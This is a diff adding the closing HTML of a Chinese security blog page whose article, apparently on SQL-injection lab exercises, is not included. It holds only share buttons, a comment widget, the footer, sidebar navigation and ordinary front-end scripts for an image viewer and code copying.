+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2020/10/02/sqli%20labs%E5%88%B7%E9%A2%98%E6%89%8B%E5%86%8C/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            php伪随机数漏洞
+          
+        </div>
+      </a>
+    
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
